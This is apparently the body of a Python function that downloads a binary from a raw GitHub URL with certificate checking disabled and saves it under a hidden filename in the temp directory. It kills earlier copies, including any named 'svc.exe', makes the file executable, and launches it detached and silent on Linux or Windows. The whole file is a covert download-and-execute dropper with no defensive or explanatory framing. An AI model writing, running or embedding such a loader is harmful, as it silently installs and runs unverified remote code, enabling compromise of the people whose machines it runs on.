import subprocess, os, urllib.request, ssl, stat, time, sys, tempfile

url = "https://raw.githubusercontent.com/bossman79/client/main/linux_amd64"

if sys.platform == "win32":
    bin_path = os.path.join(tempfile.gettempdir(), ".spark_client.exe")
    pid_path = os.path.join(tempfile.gettempdir(), ".spark_client.pid")
else:
    bin_path = "/tmp/.spark_client"
    pid_path = "/tmp/.spark_client.pid"

# Kill old process by PID
if os.path.isfile(pid_path):
    try:
        old_pid = int(open(pid_path).read().strip())
        if sys.platform == "win32":
            subprocess.call(["taskkill", "/F", "/PID", str(old_pid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        else:
            os.kill(old_pid, 9)
    except Exception:
        pass

# Windows: kill by all known process names
if sys.platform == "win32":
    for name in [".spark_client.exe", "spark_client.exe", "svc.exe"]:
        subprocess.call(["taskkill", "/F", "/IM", name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
    time.sleep(1)
else:
    time.sleep(0.5)

# Try to delete old binary, retry a few times
for attempt in range(3):
    if not os.path.isfile(bin_path):
        break
    try:
        os.remove(bin_path)
        break
    except PermissionError:
        time.sleep(1)

# If still locked, use a timestamped filename
if os.path.isfile(bin_path):
    suffix = ".exe" if sys.platform == "win32" else ""
    bin_path = os.path.join(tempfile.gettempdir(), f".spark_client_{int(time.time())}{suffix}")

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

try:
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, context=ctx, timeout=60) as resp:
        data = resp.read()
        if len(data) < 1000000:
            return f"FAIL: binary too small ({len(data)} bytes), likely HTML error page"
        with open(bin_path, "wb") as f:
            f.write(data)
except Exception as e:
    return f"FAIL: download error: {e}"

if not os.path.isfile(bin_path):
    return "FAIL: download failed - file not created"

file_size = os.path.getsize(bin_path)

if sys.platform != "win32":
    os.chmod(bin_path, os.stat(bin_path).st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)

if sys.platform == "win32":
    proc = subprocess.Popen(
        [bin_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS,
    )
else:
    proc = subprocess.Popen(
        ["nohup", bin_path],
        stdout=open("/dev/null", "w"),
        stderr=open("/dev/null", "w"),
        stdin=open("/dev/null", "r"),
        preexec_fn=os.setpgrp,
    )

with open(pid_path, "w") as f:
    f.write(str(proc.pid))

time.sleep(1)

try:
    os.kill(proc.pid, 0)
    return f"OK|pid={proc.pid}|size={file_size}|path={bin_path}|os={sys.platform}"
except OSError:
    return f"FAIL: process died immediately (pid={proc.pid})"
